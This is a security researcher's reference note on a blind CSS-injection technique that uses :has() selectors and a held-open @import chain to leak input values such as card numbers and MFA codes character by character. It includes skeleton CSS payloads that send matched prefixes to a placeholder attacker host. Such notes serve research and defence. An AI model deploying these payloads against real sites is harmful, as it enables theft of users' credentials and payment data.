---
title: CSS :has() + :not() blind input enum
slug: css-has-not-input-enum
created_utc: 2026-05-13T00:00:00Z
updated_utc: 2026-05-13T00:00:00Z
tags: [technique/css-injection]
inbound: []
---

# CSS :has() + :not() blind input enum

Donut + Pepe Villa + Gareth Hayes (PortSwigger).

## Pattern
Use CSS4 `:has()` and `:not()` selectors plus a delaying-import chain
(`@import` to attacker server with response held open) to bind-exfiltrate
input field values blind. Char-by-char enumeration of credit-card numbers,
MFA codes, hidden CSRF tokens.

## Preconditions
- CSS injection sink (style attribute, <style> block, attacker-controlled
  CSS file).
- Browser with `:has()` support (modern Chrome, Safari, Firefox 121+).
- A target attribute selector — `input[value^="prefix"]` or similar — to
  match.

## Detection
- Static CSS injection sinks via PortSwigger Gareth's blind-CSS-injection
  tool.

## Triggering
Per-character probe (skeleton):
```css
input[value^="4111"]:has(+ #marker) {
  background: url(//attacker/found?prefix=4111);
}
```
Plus delaying import-chain to sequence character probes serially:
```css
@import url(//attacker/wait/0);
@import url(//attacker/wait/1);
...
```
attacker server holds connection open for previous probes, releases when
ready for next char.

## Related
- CSS keylogger via per-field iframe + postMessage race (Ep 8).
- CSS recursive `@import` font-load chain (Donut, Ep 8).
- CSS container-queries char-width leak idea (dead-end, Ep 62).
- CSS perspective leak — populate page through victim's authenticated
  perspective (Ep 62).
- portswigger/css-exfiltration repo: `steal-reversed-firefox`,
  `steal-script-contents`, `steal-attribute-values-checkboxes`.

## Seen in the wild
- Multiple H1 reports pending CSS-spec-feature ship (Justin Gardner).
- Critical Thinking Podcast Ep 51.

## References
- Critical Thinking Podcast Eps 8, 51, 62
- portswigger.net — CSS exfil research
- portswigger/css-exfiltration GitHub
